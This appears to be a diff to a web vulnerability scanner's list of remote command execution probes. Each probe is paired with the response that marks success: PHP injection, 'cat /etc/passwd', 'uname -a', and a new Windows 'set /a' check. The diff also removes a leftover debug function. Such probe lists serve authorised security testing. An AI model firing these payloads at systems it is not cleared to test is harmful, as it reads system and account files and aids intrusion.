@@ -117,20 +117,11 @@ RCEPayload_RESP = [
 	['\'xor(phpinfo)or\'', 'phpinfo page'],
 	['cat /etc/passwd', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'],
 	['uname -a', 'Linux'],
-	['cat /proc/version', 'Linux']
+	['cat /proc/version', 'Linux'],
+	['set /a 1+222']
 ]
 
-import json
-from urllib import parse
-def main():
-	aaa = '%7B%27ip%27%3A%20%27127.0.0.1%27%2C%20%27submit%27%3A%20%27submit%27%7D'
-	# print(json.loads(parse.unquote(str)))
-	test = dict()
-	test['a'] = 1
-	print(json.dumps(test))
 
-
-
-
-if __name__ == '__main__':
-	main()
+FILE_SCAN_PAYLODS = [
+	
+]
